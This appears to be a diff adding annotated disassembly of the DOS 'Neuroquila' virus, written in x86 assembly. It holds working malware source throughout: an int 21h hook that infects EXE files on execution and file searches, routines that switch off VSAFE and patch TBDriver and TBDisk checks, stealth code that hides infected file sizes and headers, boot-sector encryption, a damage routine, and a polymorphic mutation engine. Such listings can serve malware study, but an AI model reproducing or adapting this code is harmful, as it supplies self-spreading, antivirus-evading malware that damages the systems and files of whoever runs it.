+	cmp     word ptr [di-07h],5641h
+	jnz     chk4win
+	mov     byte ptr on_open_file,do_function
+;assume ds:nothing
+chk4win:
+	mov     si,offset win_cmdline
+	cmp     word ptr [di-08h],4957h         ; 'WI' ?
+	jnz     chk4tbscan
+	cmp     byte ptr [di-06h],4eh           ; 'WIN' ?
+	jz      add_extra_param                 ; Pass arguments to Windows
+chk4tbscan:
+	mov     si,offset tbav_cmdline
+	cmp     word ptr [di-0ah],5342h         ; 'BS' ?
+	jnz     last2_param_char
+	cmp     word ptr [di-07h],4E41h         ; 'BS?AN' ?
+	jnz     last2_param_char
+	; Pass arguments to TBSCAN
+add_extra_param:
+	; pass arguments from ds:si to current commandline
+	mov     di,offset disk_buff
+	mov     bx,di
+	mov     byte ptr [di],0FFh
+	inc     di
+next1_param_char:
+	lodsb
+	or      al,al
+	jz      last1_param_char
+	stosb
+	inc     byte ptr [bx]
+	jmp     next1_param_char
+last1_param_char:
+	; Concate ParamStr to what it passes to special programs
+	mov     si,save_bx
+	mov     ds,save_es
+	mov     ax,cs
+	xchg    ax,word ptr [si+4]              ; Segment of ParamString
+	push    ax
+	mov     ax,bx
+	xchg    ax,word ptr [si+2]              ; Offset of ParamStr
+	xchg    si,ax
+	pop     ds                      ; => DS:SI ParamString
+assume  ds:nothing
+	inc     si
+next2_param_char:
+	lodsb
+	stosb
+	inc     word ptr cs:[bx]        ; increase size of param-string by 1
+	cmp     al,0dh
+	jnz     next2_param_char
+
+	;
+last2_param_char:
+	push    cs
+	pop     ds
+assume  ds:code2
+	mov     byte ptr dosf_11_12,switch_on
+					; do infection on FCB file-search
+	mov     ah,2Fh
+	int     21h                     ; Get DTA
+	push    bx
+	push    es
+	mov     ah,1ah
+	mov     dx,offset vir_dta
+	int     21h                     ; Set DTA
+	mov     ax,3524h
+	int     21h                     ; Get int 24h vector
+	push    bx                      ; and save
+	push    es
+	mov     ah,25h                  ; set new Int 24h to cs:virint24
+	push    ax
+	mov     dx,offset virint24
+	int     21h
+	mov     bl,0
+	call    switch_vsafe            ; switch off VSAFE
+	mov     ah,4eh
+	mov     cx,27h                          ; all files
+	call    filename_int21                  ; find the file
+	jc      floppy_not_OK                   ; not found
+	mov     si,offset my_size
+	xor     di,di
+	cmp     byte ptr [si+4],2               ; Drive to access
+	ja      not_floppy
+	push    dx
+	mov     ch,4
+	mov     dx,3F5h                         ; floppy disk status port
+	mov     al,4                            ; sense drive status command
+	out     dx,al
+	loop    $                               ; wait for floppy to respond
+	mov     ch,4
+	out     dx,al                           ; try it again
+	loop    $                               ; wait again
+	in      al,dx                           ; get status
+	test    al,40h                          ; floppy OK ?
+	pop     dx
+	jnz     floppy_not_OK                   ; No
+not_floppy:
+	call    @@131                           ; infect the file
+floppy_not_OK:
+	pop     ax
+	pop     ds
+	pop     dx
+	int     21h
+	mov     ah,1ah                          ; restore DTA
+	pop     ds
+	pop     dx
+	int     21h
+
+;---------------------------------------------------------------------------------------;
+; VSafe away-functions                                                                  ;
+;---------------------------------------------------------------------------------------;
+
+; Bitfields for VSAFE/VWATCH parameter flags (BL):
+; Bit(s)        Description     (Table 0429)
+; 7     Protect executable files
+; 6     Protect FD boot sector
+; 5     Protect HD boot sector
+; 4     Boot sector viruses
+; 3     Check executable files
+; 2     General write protect
+; 1     Resident
+; 0     HD Low level format
+restore_vsafe:
+;       mov     bl,0
+	db      0B3h
+old_vsafe_state         db      ?
+
+assume  ds:nothing
+switch_vsafe:
+	pusha
+	mov     ax,0FA02h
+	mov     dx,5945h
+	int     16h                     ; change VWATCH / VSAFE state
+	mov     old_vsafe_state,cl              ; safe old state
+	popa
+ret1:
+	ret
+
+
+;---------------------------------------------------------------------------------------;
+; Virus' int 21 (continued)                                                             ;
+;---------------------------------------------------------------------------------------;
+
+@@131:
+	cmp     word ptr [si+20h],di            ; Higher Word of file size 0 ?
+	jnz     file_big_enough                 ; No, file at least 10000h Byte long
+	cmp     word ptr [si+1eh],2711h         ; File at least 10000(dez) Byte long ?
+	jb      ret1                            ; No
+file_big_enough:
+	mov     ah,2ah
+	int     21h                     ; Get date
+	mov     ax,[si+1ch]             ; Filedate
+	shr     ax,1                    ; DIV 2
+	sub     cl,0bch                 ; ( Year - 1980 ) and 0ffh
+	cmp     ah,cl                   ; fits to filedate ?
+	jnz     date_check_failed       ; no
+	shr     ax,4                    ; DIV 16
+	and     al,0Fh                  ; only 4 lower bits
+	cmp     al,dh                   ; fits to filedate ?
+	jz      ret1
+date_check_failed:
+	mov     al,[si+19h]             ; file attributes
+	and     al,7
+	jz      file_attribs_allready_ok
+	mov     ax,4301h                ; set new file attributes
+	xor     cx,cx
+	call    filename_int21
+file_attribs_allready_ok:
+	mov     ax,3d02h                ; open file for read/write
+	call    filename_int21
+	jc      @@137
+	xchg    bx,ax                   ; pass handle into bx
+	mov     ax,5700h                ; get files time/date
+	int     21h
+	push    cx                      ; save them
+	push    dx
+	mov     ah,3fh                  ; read first 19h byte of file
+	call    cx25_int21
+	jb      file_is_infected
+	cmp     byte ptr [si+18h],40h   ; offset of relocation table is 40h ?
+	jz      file_is_infected        ; yes, seems to be windows-exe
+	mov     ax,[si]
+	add     al,ah                   ; sum of first two bytes same as on exe-files ?
+	cmp     al,0A7h
+	jnz     file_is_infected        ; no, can not be EXE-File
+	mov     ax,[si+4]               ; count of 512-byte-pages in the file
+	dec     ax                      ; - 1
+	xor     dx,dx
+	mov     bp,200h
+	mul     bp                      ; * 512
+	add     ax,[si+2]               ; + byte in last page
+	adc     dx,di                   ; => imagesize in byte
+	cmp     [si+1eh],ax             ; compare with filesize
+	jnz     file_is_infected
+	cmp     [si+20h],dx
+	jnz     file_is_infected
+	;
+	mov     al,2
+	call    seek                    ; seek to end of file
+	call    chk4infection           ; some more infection checking
+	jz      file_is_infected        ; allreay infected
+	call    dosf_4c
+	call    infect_file             ; infect it now
+file_is_infected:
+	mov     ax,5701h
+	pop     dx
+	pop     cx
+	call    do_int21                ; restore files date/time
+	mov     ah,3eh                  ; close file
+	int     21h
+@@137:
+	mov     ax,4301h
+	xor     cx,cx
+	mov     cl,[si+19h]
+	cmp     cl,20h
+	jz      not_reset_attribs
+filename_int21:
+	mov     dx,offset filename
+	jmp     do_int21                ; restore files attributes
+not_reset_attribs:
+	ret
+
+assume  ds:code2
+infect_file:
+	mov     ax,[si+0eh]             ; Initial SS
+	mov     init_ss,ax
+	mov     ax,[si+10h]             ; Initial SP
+	mov     init_sp,ax
+	mov     ax,[si+14h]             ; Initial IP
+	mov     init_ip,ax
+	mov     ax,[si+16h]             ; Initial CS
+	mov     init_cs,ax
+	mov     ax,[si+0Ch]             ; max. count of paragraphs above
+	cmp     ah,0FFh
+	jz      not_update_maxparas
+	mov     ax,[si+04h]             ; Size of file in pages
+	cwd
+	mov     cx,20h
+	mul     cx                      ; => * 512 / 16
+	sub     ax,[si+08h]             ; Size of Header
+	add     ax,[si+0Ch]             ; max. count of paragraphs above
+;       add     ax,10h
+	db      05h
+@@155   dw      10h                     ; + 10h
+not_update_maxparas:
+	mov     progmem,ax
+	mov     ah,0
+	int     1ah                     ; Get Timer
+	push    dx                      ; saver lower part of timer value
+	xchg    dx,ax
+	mov     ah,marker               ; calculate encryption value for
+	sub     ah,al                   ; saved header
+	neg     ax
+	mov     word ptr [si+offset head_encr_val- offset head_buff],ax
+	pop     ax                      ; timer value (low)
+	mov     cl,ah
+	and     ax,001Fh                ; and 01Fh
+	shl     ax,4                    ; * 16
+	mov     @@144,ax                ; offset of decryptor ???
+	mov     dx,[si+offset l_org_fsize-offset head_buff]
+	and     dx,0fh
+	add     ax,dx
+	mov     @@145,ax
+	and     cl,1Fh
+	mov     @@146,cx
+	mov     ax,[si+offset l_org_fsize-offset head_buff]
+	add     ax,offset my_size + extra_size
+	mov     dx,ax
+	or      al,1fh
+	sub     ax,dx
+	mov     @@147,ax
+	push    ax
+;       push    0BE00
+	db      68h
+	dw      0BE00h
+	pop     es                              ; ES := 0BE00h
+	xor     di,di
+	cmp     word ptr es:[di],0720h  ; woops test if there is space in the Video-RAM
+	jz      do_mutate               ; yeah seems to be free, so use for engine
+	pop     ax
+write_failure:
+	ret
+do_mutate:
+	call    mutate
+	mov     ah,40h
+	mov     cx,offset my_size
+	call    cwd_int21               ; write the virus
+	cmp     ax,cx                   ; all written ?
+	pop     cx
+	mov     word ptr ds:[di],0720h  ; make sure we know the video buf is OK
+	push    cs
+	pop     ds
+	jnz     write_failure           ; not all byte written
+	mov     dh,13h
+	call    write_to_file
+	mov     cx,extra_size
+	mov     dx,offset my_size
+	call    endecrypt_head
+	call    write_to_file
+	call    endecrypt_head
+	call    seek_to_begin
+	mov     ax,[si+1eh]
+	mov     dx,[si+20h]
+	push    ax
+	push    dx
+	add     ax,offset my_size+extra_size
+	adc     dx,di
+;       add     ax,17h
+	db      05h
+@@147   dw      0017h
+	adc     dx,di
+	div     bp
+	inc     ax
+	mov     word ptr [si+4],ax      ; adjust header pages
+	mov     word ptr [si+2],dx      ; adjust byte in last page
+	pop     dx
+	pop     ax
+	div     @@155
+	sub     ax,[si+08h]             ; header size
+	push    ax
+;       mov     cx,60h
+	db      0B9h
+@@144   dw      0060h
+	shr     cx,4
+	sub     ax,cx
+	mov     word ptr [si+16h],ax    ; new initial CS
+	pop     ax
+	dec     ax
+;       add     ax,4
+	db      05h
+@@146   dw      4
+	mov     word ptr [si+0eh],ax    ; new initial IP
+	add     dx,@@144
+	mov     [si+14h],dx
+	mov     ax,1600h
+	mov     dx,@@146
+	shl     dx,4
+	sub     ax,dx
+	mov     word ptr [si+10h],ax            ; new initial SP
+	add     word ptr [si+0ah],161h          ; adjust min params by virus_params
+	mov     ax,[si+0ah]                     ; get new min params
+	cmp     word ptr [si+0ch],ax            ; max > min ?
+	ja      write_25byte_to_file            ; yes
+	mov     word ptr [si+0ch],ax            ; no then max:=min
+write_25byte_to_file:
+	mov     ah,40h
+cx25_int21:
+	mov     cx,19h
+	mov     dx,si
+do2_int21:
+	jmp     do_int21
+
+seek_to_begin:
+	mov     al,0
+seek:
+	mov     ah,42h                  ; Seek
+	xor     cx,cx                   ; Higher position value is 0
+cwd_int21:
+	cwd
+	jmp     do2_int21               ; call int 21h
+
+dosf_4e:
+	cld
+	push    cs
+	pop     es
+	; Copy filename, find last '\' and save position to last_backslash_pos
+	mov     si,dx
+	mov     di,offset filename
+	mov     cx,di
+next2_filename_char:
+	lodsb
+	stosb
+	cmp     al,'\'
+	jnz     no_backslash
+	mov     cx,di
+no_backslash:
+	or      al,al
+	jnz     next2_filename_char
+assume  ds:nothing
+	mov     last_backslash_pos,cx
+	call    reg_restore
+assume  ds:code2
+
+dosf_4f:
+	add     sp,6
+	int     21h
+	jb      @@167
+	push    ax
+	call    check_filesize
+	jb      open2_failure
+	push    ds
+	lea     si,[bx+1eh]
+;       mov     di,offset filename
+	db      0BFh
+last_backslash_pos      dw      offset filename
+	mov     dx,offset filename
+	mov     cx,0dh
+	push    cs
+	pop     es
+	rep     movsb                   ; copy file name (without path)
+	pop     es
+	push    cs
+	pop     ds
+	mov     si,bx
+infect_fcb_file:
+	mov     ax,3d00h
+	call    do_int21                        ; open file for reading
+	jb      open2_failure
+	xchg    bx,ax
+	call    dosf_4c
+	call    chk4infection
+	pushf
+	mov     ah,3eh
+	int     21h                             ; close the file
+	popf
+	jnz     open2_failure
+	mov     ax,l_org_fsize
+	mov     word ptr es:[si+1ah],ax
+	mov     ax,h_org_fsize
+	mov     word ptr es:[si+1ch],ax
+open2_failure:
+	pop     ax
+	clc
+@@167:
+	push    ax
+	call    restreg_and_prep_leaving
+	pop     ax
+	retf    2
+
+dosf_11_12:
+	nop
+	add     sp,6
+	int     21h                             ; do search file
+	cmp     al,0
+	jnz     @@167
+	push    ax
+	call    check_filesize
+	jb      open2_failure
+	push    cs
+	pop     es
+	lea     si,[bx-2]
+	mov     di,offset head_buff
+	mov     dx,di
+	cld
+	mov     cx,8
+	call    find_space
+	mov     al,'.'
+	stosb
+	lea     si,[bx+6]
+	mov     cl,3
+	call    find_space
+	mov     al,0
+	stosb
+	push    ds
+	pop     es
+	jmp     infect_fcb_file
+
+find_space:
+	lodsb
+	cmp     al,20h
+	jz      found_space
+	stosb
+	loop    find_space
+found_space:
+	ret
+
+assume  ds:nothing
+check_filesize:
+	mov     ah,2fh
+	int     21h                             ; Get DTA
+	push    es
+	pop     ds
+	cmp     byte ptr [bx],0ffh              ; extended FCB ?
+	jnz     @@172                           ; No
+	add     bx,7                            ; adjust offset
+@@172:
+	cmp     byte ptr save_ax+1,12h          ; was it FCB find ?
+	ja      @@173                           ; no
+	add     bx,3                            ; adjust offset
+@@173:
+	mov     al,[bx+1ah]                     ; file size
+	and     al,1fh                          ; mask 5 lower bits
+	cmp     al,1fh                          ; all setted ?
+	jz      @@174                           ; file maybe infected
+	stc
+	ret
+@@174:
+	cmp     word ptr [bx+1ch],0
+	jnz     @@175
+	cmp     word ptr [bx+1ah],2711h
+@@175:
+	ret
+
+assume  ds:code2
+chk4infection:
+	mov     ax,4400h
+	int     21h                     ; read IOCTL-attributes
+	test    al,80h                  ; *** should better use dl
+					; device is a char-device ?
+	jnz     not_exe                 ; Yes
+	push    cs
+	pop     ds
+	mov     al,1
+	call    seek
+	jb      not_exe
+	mov     l_org_fpos,ax
+	mov     h_org_fpos,dx
+;       cmp     bl,0
+	db      80h,0FBh
+file_handle     db      0
+	jz      allready_read
+	mov     ax,4202h
+	mov     cx,0ffffh
+	mov     dx,0ffdch
+	int     21h
+	mov     file_handle,bl
+	mov     ah,3fh
+	mov     cx,extra_size
+	mov     dx,offset head_buff
+	int     21h
+	call    endecrypt_head
+restore_old_fpos:
+	mov     ax,4200h
+;       mov     dx,2b04h
+	db      0BAh
+l_org_fpos      dw      ?
+;       mov     cx,0
+	db      0B9h
+h_org_fpos      dw      ?
+	int     21h
+allready_read:
+	cmp     byte ptr head_buff,5ah
+	jz      exe_file
+	cmp     byte ptr head_buff,4dh
+	jnz     not_exe
+exe_file:
+	push    ax
+	mov     ax,head_encr_val
+	neg     ax
+	add     al,ah
+	cmp     al,marker
+	pop     ax
+not_exe:
+	ret
+
+assume  ds:nothing
+; Fixes the problem of seeks from the fileend
+dosf_42:
+	cmp     al,2            ; seek from end of file ?
+	jnz     not_exe         ; No
+	call    chk4infection
+	jnz     not_exe         ; file is not infected
+	add     sp,6
+	call    reg_restore
+	push    cx
+	mov     al,0            ; seek from filebegin instead
+	mov     cx,h_org_fsize
+	mov     dx,l_org_fsize
+	add     dx,save_dx
+	adc     cx,0
+	add     cx,save_cx      ; org filesize + seek offset
+	int     21h
+	call    prepare_leave_int21
+	pop     cx
+	jmp     leave_int21
+
+assume  ds:code2
+dosf_3f:
+; Makes it impossible to read after the end of the original file
+	push    cx
+	call    chk4infection
+	pop     bp
+	jnz     not_exe                 ; file is not infected
+	add     sp,6
+	mov     si,offset head_buff
+	sub     ax,[si+1eh]             ; actual filepos < original filesize ?
+	sbb     dx,0
+	sub     dx,[si+20h]
+	js      @@183                   ; yes
+	call    restreg_and_prep_leaving
+	sub     ax,ax                   ; nothing read due end of file
+	clc
+	jmp     leave_int21
+@@183:
+	add     ax,bp
+	adc     dx,0
+	jnz     @@184
+	sub     bp,ax                   ; byte left to read
+@@184:
+	push    bp
+	call    reg_restore
+	pop     cx
+	int     21h                     ; read up to original filesize
+	pushf
+	push    ax
+	jb      no_header_read
+	; fix header entries read
+	push    ds
+	pop     es
+	mov     di,dx
+	push    cs
+	pop     ds
+	mov     si,offset head_buff
+	cmp     h_org_fpos,0
+	jnz     no_header_read
+	mov     ax,l_org_fpos
+	cmp     ax,18h
+	jnb     no_header_read
+	add     si,ax
+	add     cx,ax
+	cmp     cx,18h
+	jbe     @@186
+	sub     ax,18h
+	neg     ax
+	xchg    cx,ax
+@@186:
+	cld
+	rep     movsb
+no_header_read:
+	call    restreg_and_prep_leaving
+	pop     ax
+	popf
+leave_int21:
+	retf    2
+
+assume  ds:nothing
+dosf_3e:
+dosf_4c:
+	mov     file_handle,0           ; saved header not read yet
+	mov     head_encr_val,0         ; no encryption of saved header yet
+	ret
+
+dosf_44:
+	cmp     al,52h                          ; get DR-DOS version ?
+	jnz     no_DRDOS                        ; no
+
+dosf_32:
+	mov     byte ptr dosf_11_12,switch_off
+					; no infection on FCB file-search
+no_DRDOS:
+	ret
+
+;assume ds:nothing
+patch_new_intcode:
+	cmp     ah,25h
+	jnz     @@19
+dosf_25:
+	mov     si,dx
+	cmp     word ptr [si],30CDh
+	jnz     int01patches
+	lds     dx,dword ptr tunneled_ofs
+	push    ds
+	pop     es
+	mov     ax,dx
+	mov     bh,13h
+	xchg    bx,ax
+	int     2Fh                     ; set disk interrupt handler
+	mov     ax,word ptr ds:[0FFFFh] ; This will cause CPU exception
+	jmp     $                       ; This will crash the CPU
+
+int01patches:
+	mov     ax,word ptr ds:[si]
+	cmp     al,0EBh                         ; JMP disp8 ?
+	jnz     not_TBDriver                    ; No
+	cmp     word ptr ds:[si+7],09CFAh       ; CLI; PUSHF ?
+	jnz     not_TBDriver                    ; No
+	cmp     word ptr ds:[si+9],053FCh       ; CLD; PUSH BX ?
+	jnz     not_TBDriver                    ; No
+	mov     byte ptr ds:[si],0A8h           ; replace with TEST AL,value8
+						; TBDriver Int 21h patch
+	; this patches out the trace-mode detection for int 21h
+not_TBDriver:
+	cmp     ax,09CFAh                       ; CLI; PUSHF ?
+	jnz     not_TBDisk                      ; No
+	cmp     word ptr ds:[si+4],006F6h       ; TEST [value16],value8
+	jnz     not_TBDisk                      ; No
+	mov     byte ptr ds:[si+9],0EBh         ; TBDisk Int 13h patch
+	; disables int 13h tests of TBDisk
+not_TBDisk:
+	; Check for smartdrv ???
+	; But not for version 5.0 !
+	cmp     ax,0832Eh                       ; CS:; some byte operation ?
+	jnz     @@16                            ; No
+	cmp     word ptr ds:[si+9],05550h       ; PUSH AX; PUSH BP ?
+	jnz     @@16                            ; No
+	cmp     byte ptr ds:[si+016eh],0e8h     ; CALL disp16 ?
+	jnz     @@16                            ; No
+	mov     byte ptr ds:[si+016eh],0c3h     ; replace CALL with retn
+@@16:
+	cmp     ax,030CDh
+	jnz     @@18
+	jmp     $
+@@18:
+	cmp     ax,02EFBh                       ; STI; CS: ?
+	jnz     @@20                            ; No
+	cmp     word ptr ds:[si+7],00375h       ; JNZ $+5 ?
+	jnz     @@19                            ; No
+	cmp     word ptr ds:[si+0dh],0FAFCh     ; CLD; CLI ?
+	jnz     @@19                            ; No
+	mov     byte ptr ds:[si+8],0            ; JNZ $+5 -> JNZ $+2
+@@19:
+	ret
+@@20:
+	cmp     ax,0EB9Ch                       ; PUSHF; JMP disp16 ?
+	jnz     @@19                            ; No
+	cmp     word ptr [si+2],08000h          ; JMP $+2; some byte op. ?
+	jnz     @@19                            ; No
+	mov     byte ptr [si+7],0               ; fix something but what ???
+	ret
+
+assume  ds:code2
+dosf_40:
+; Disinfect infected files before writing to them
+	call    chk4infection
+	jnz     @@19                    ; file is not infected
+	call    seek_to_begin           ; seek to begin of file
+	mov     si,offset head_buff
+	call    write_25byte_to_file    ; restore first 19h byte of file
+	jb      @@189
+	mov     ax,4200h
+	mov     cx,h_org_fsize
+	mov     dx,l_org_fsize          ; seek to original filesize
+	int     21h
+	mov     ah,40h
+	xor     cx,cx                   ; truncate file here ???
+	call    do_int21
+@@189:
+	jmp     restore_old_fpos
+
+;---------------------------------------------------------------------------------------;
+; Virus' int13-tools                                                                    ;
+;---------------------------------------------------------------------------------------;
+
+assume  ds:nothing
+write_1_sect:
+	mov     ax,301h                 ; write one sector
+call_int13:
+	push    bx
+	xor     bx,bx
+	call    switch_vsafe            ; switch vsafe off
+	pop     bx
+	cli
+	pushf
+	call    dword ptr tunneled_ofs
+	push    bx
+	pushf
+	call    restore_vsafe           ; switch vsafe on
+	popf
+	pop     bx
+	ret
+
+write_to_file:
+	mov     ah,40h
+do_int21:
+	cli
+	pushf
+	call    dword ptr tun21_ofs
+	ret
+
+;---------------------------------------------------------------------------------------;
+; En-/Decryption tools for the boot/MBR part of the virus                               ;
+;---------------------------------------------------------------------------------------;
+crypted_int13:
+	call    encrypt_sector
+	call    call_int13
+
+; Encrypt 200h bytes at ds:bx (es=ds)
+encrypt_sector:
+	pusha
+	mov     si,bx
+	mov     di,bx
+	mov     cl,dh
+	mov     dx,0DEADh               ; initial encryption value
+	shl     dx,cl
+	mov     cx,0ffh
+encrypt_next_word:
+	db      26h                     ; ES:
+	lodsw
+	xor     ax,dx
+	add     dx,07fh                 ; modify the encryption value
+	stosw
+	loop    encrypt_next_word
+	popa
+	ret
+	
+endecrypt_head:
+	pusha
+	mov     si,dx
+	mov     bl,ds:[si+23h]
+	dec     cx
+encrypt_next_byte:
+	lodsb
+	xor     al,bl
+	add     bl,cl
+	mov     byte ptr [si-1],al
+	loop    encrypt_next_byte
+	popa
+	ret
+
+;---------------------------------------------------------------------------------------;
+; The Damage-function of Neuroquila                                                     ;
+;---------------------------------------------------------------------------------------;
+
+;assume ds:nothing
+damage_switch:
+	db      switch_off              ; ret is patched away to enable
+	pusha                           ; the damage function
+;       mov     cx,1
+	db      0B9h
+damage_delay    dw      1
+	loop    $
+	inc     byte ptr damage_delay
+	jnz     no_damage_yet
+	mov     ax,3
+	int     10h                     ; set video mode 3
+	mov     ah,2
+	mov     bh,0
+	mov     dx,0C03h                ; row 12 column 3
+	int     10h
+	mov     si,offset havoc_text
+next_output_char:
+	db      2Eh                     ; CS:
+	lodsb
+	xor     al,0f5h
+	int     29h                     ; fast console output of char in AL
+	or      al,al
+	jnz     next_output_char
+	cbw
+	int     16h                     ; wait for key
+no_damage_yet:
+	popa
+	ret
+
+;---------------------------------------------------------------------------------------;
+; Text coded with simple XOR key F5
+; <HAVOC> by Neurobasher'93/Germany -GRIPPED-BY-FEAR-UNTIL-DEATH-US-DO-PART-
+;---------------------------------------------------------------------------------------;
+
+havoc_text:
+	db 0C9h, 0BDh, 0B4h, 0A3h, 0BAh, 0B6h, 0CBh, 0D5h, 097h, 08Ch, 0D5h, 0BBh, 090h
+	db 080h, 087h, 09Ah, 097h, 094h, 086h, 09Dh, 090h, 087h, 0D2h, 0CCh, 0C6h, 0DAh
+	db 0B2h, 090h, 087h, 098h, 094h, 09Bh, 08Ch, 0D5h, 031h, 0B2h, 0A7h, 0BCh, 0A5h
+	db 0A5h, 0B0h, 0B1h, 031h, 0B7h, 0ACh, 031h, 0B3h, 0B0h, 0B4h, 0A7h, 031h, 0A0h
+	db 0BBh, 0A1h, 0BCh, 0B9h, 031h, 0B1h, 0B0h, 0B4h, 0A1h, 0BDh, 031h, 0A0h, 0A6h
+	db 031h, 0B1h, 0BAh, 031h, 0A5h, 0B4h, 0A7h, 0A1h, 031h, 0F5h
+	
+;---------------------------------------------------------------------------------------;
+; The Mutation-Engine of Neuroquila                                                     ;
+;---------------------------------------------------------------------------------------;
+; ES = BE00  - working segment
+; DI = 0000
+; "[bp+4]" means thhe value stored in [bp+4] is inserted directly
+
+assume  ds:code2
+mutate:
+	pusha
+	; copy whole virus
+	xor     si,si
+	mov     cx,offset memory_top
+	rep     movsb
+	; init the engine
+	mov     si,offset engine_data
+	sub     di,di
+	xor     ax,ax
+	mov     encr_val2,ax
+	mov     encr_val_method_of_modify,35h           ; XOR AX,
+	mov     encr_val_modifier,ax
+	mov     word ptr [si+ offset encr_opcode3 - offset engine_data],9090h
+						; NOP; NOP 
+	mov     byte ptr [si+ offset encr_opcode2 - offset engine_data],05h
+	mov     ah,2Ch
+	int     21h                             ; Get time
+	mov     [si+ offset time - offset engine_data],cx                       ; hour and minute
+	mov     [si+ offset time - offset engine_data +2],dx                    ; second and msec
+	mov     ah,2Ah
+	int     21h                             ; Get date
+	mov     [si+ offset date - offset engine_data],cx       ; Year
+	mov     [si+ offset date - offset engine_data +2],al                    ; Day of week
+	push    dx                              ; Month and day of Month
+	mov     ah,0
+	int     1ah                             ; read timer
+	xchg    bp,cx
+	pop     cx
+	xchg    si,bx
+	cld
+	mov     ax,cx
+	add     ax,dx
+	xor     ax,bp
+	mov     [bx+ offset modifier_value - offset engine_data],ax
+	mov     ax,dx
+	or      ax,bp
+	rol     ax,1
+	neg     ax
+	mov     [bx+ offset encr_val1 - offset engine_data],ax
+	mov     [bx+ offset encr_val2 - offset engine_data],ax
+	; Write register inits
+;       push    word ptr offset init_addr
+	db      68h
+init1   dw      offset init_addr
+;       push    word ptr offset init_encr_val
+	db      68h
+init2   dw      offset init_encr_val
+;       mov     ax,offset init_ds
+	db      0B8h
+init3   dw      offset init_ds
+	call    ax
+	pop     ax
+	call    ax
+	pop     ax
+	call    ax
+	; Change position of register-inits for next run
+	mov     ax,init1
+	xchg    ax,init2
+	xchg    ax,init3
+	test    cl,1
+	jz      permutate_inits
+	xchg    ax,init2
+permutate_inits:
+	mov     init1,ax
+	;
+	mov     al,0fh
+	call    gen_limit_junk
+	; Save loop-begin
+	mov     [bx+ offset loop_begin_pos - offset engine_data],di
+	; Choose carry-flag setting for encryption
+	mov     si,cx
+	and     si,07h
+	shl     si,1
+	cmp     si,6
+	jb      no_clc_stc
+	cmp     si,8
+	ja      no_clc_stc
+	mov     al,0f8h                         ; CLC
+	test    ch,2
+	jz      put_clc
+	inc     ax                              ; STC
+put_clc:
+	stosb
+	mov     [bx + offset encryption_loop - offset engine_data],al
+	; Generate CS: or not
+no_clc_stc:
+	test    byte ptr [bx+offset int21_counter - offset engine_data],3 ; [bx+9]
+	jnz     no_cs_pref
+	mov     al,2eh                          ; CS:
+	stosb
+no_cs_pref:
+	test    byte ptr [bx+ offset time - offset engine_data],3               ; [bx+3]
+	jnz     no_81h_pref
+	add     si,10h                  ; 0-8 without prefix 81h
+	cmp     si,18h
+	ja      no_81h_pref             ; 9-11 with pref. and 12-15 without
+	mov     al,81h
+	stosb
+no_81h_pref:
+	call    word ptr [bx+si+ offset encryption_table - offset engine_data]
+	mov     ax,offset gen_addr_inc
+	mov     si,offset gen_modifier
+	test    dl,1
+	jnz     @@205
+	xchg    si,ax
+@@205:
+	push    si
+	call    ax
+	pop     ax
+	call    ax
+	mov     al,0fh
+	call    gen_limit_junk
+	mov     si,[bx+ offset int13_counter - offset engine_data]
+	and     si,3
+	shl     si,1
+	; genrate the address-compare
+	call    word ptr [bx+si+ offset tbl_adr_cmp - offset engine_data]       ;[bx+si-28h]
+	;
+	call    genjunk_9
+	mov     al,[bx+ offset time - offset engine_data + 2]
+	and     ax,3
+	xchg    si,ax
+	add     si,offset first_jmp_table
+	movsb
+	mov     [bx+ offset cond_jmp_pos - offset engine_data],di
+	stosb
+	call    genjunk_9
+	cmp     bp,13h
+	jb      second_cond_jmp_method
+	test    byte ptr [bx+ offset time - offset engine_data],3
+	jnz     second_cond_jmp_method
+	mov     ax,0C933h                       ; XOR CX,CX
+	stosw
+	mov     al,0e3h                         ; JCXZ ?
+	stosb
+	jmp     cond_jmp_done
+second_cond_jmp_method:
+	mov     si,[bx+ offset time - offset engine_data + 3]
+	and     si,3
+	add     si,offset second_jmp_table
+	movsb
+cond_jmp_done:
+	mov     ax,[bx+ offset loop_begin_pos - offset engine_data]
+	sub     ax,di
+	dec     ax
+	cmp     byte ptr es:[di-1],0e9h         ; JMP NEAR ?
+	jz      jmp_near                        ; Yes
+	stosb                                   ; else JMP SHORT
+	jmp     looping_jmp_done
+jmp_near:
+	dec     ax
+	stosw
+looping_jmp_done:
+	push    di
+	mov     al,68h                  ; PUSH word
+	stosb
+	mov     ax,[bx+ offset @@145 - offset engine_data]
+	add     ax,offset vir_start
+	stosw
+	mov     al,0C3h                 ; RET
+	stosb
+	pop     di
+	mov     ax,[bx+ offset cond_jmp_pos - offset engine_data]
+	mov     si,ax
+	neg     ax
+	add     ax,di
+	dec     ax
+	mov     es:[si],al
+	mov     ax,offset init_ds + 100h
+	mov     si,[bx+ offset cmp_addr_pos - offset engine_data]
+	sub     ax,di
+	add     ax,[bx+ offset @@145 - offset engine_data]
+	mov     es:[si],ax
+	mov     si,[bx+ offset init_addr_pos - offset engine_data]
+	mov     ax,di
+	add     ax,[bx+ offset @@145 - offset engine_data]
+	mov     cx,5
+	push    es
+	pop     ds
+test_for_lower_byte:
+	cmp     byte ptr [si],0FEh
+	jnz     test_for_higher_byte
+	mov     byte ptr [si],al
+test_for_higher_byte:
+	cmp     byte ptr [si],0FFh
+	jnz     not_higher_byte
+	mov     byte ptr [si],ah
+not_higher_byte:
+	inc     si
+	loop    test_for_lower_byte
+;       mov     ax,7682h
+	db      0B8h
+encr_val2       dw      7682h
+	; Encrypt the virus-body itself
+encryption_loop:
+	clc
+;       sub     [di],ax
+encr_opcode1    db      29h
+encr_opcode2    db      05h
+encr_opcode3    dw      9090h           ; nop; nop
+	inc     di
+	inc     di
+;       xor     ax,0
+encr_val_method_of_modify       db      35h
+encr_val_modifier       dw      ?
+	cmp     di,offset my_size+1
+	jb      encryption_loop
+	popa
+	ret
+
+encryption_table        dw      offset gen_xor_encryption
+			dw      offset gen_add_encryption
+			dw      offset gen_sub_encryption
+			dw      offset gen_adc_encryption
+			dw      offset gen_sbb_encryption
+			dw      offset gen_not_encryption
+			dw      offset gen_neg_encryption
+			dw      offset gen_rol_ror_encryption
+			dw      offset gen_direct_xor_encryption
+			dw      offset gen_direct_add_encryption
+			dw      offset gen_direct_sub_encryption
+			dw      offset gen_direct_adc_encryption
+			dw      offset gen_direct_sbb_encryption
+			dw      offset gen_not_encryption
+			dw      offset gen_neg_encryption
+			dw      offset gen_rol_ror_encryption
+
+modifier_table  dw      offset gen_add_sub_modifier
+		dw      offset gen_add_sub_modifier
+		dw      offset gen_xor_modifier
+		dw      offset gen_rol_ror_modifier
+
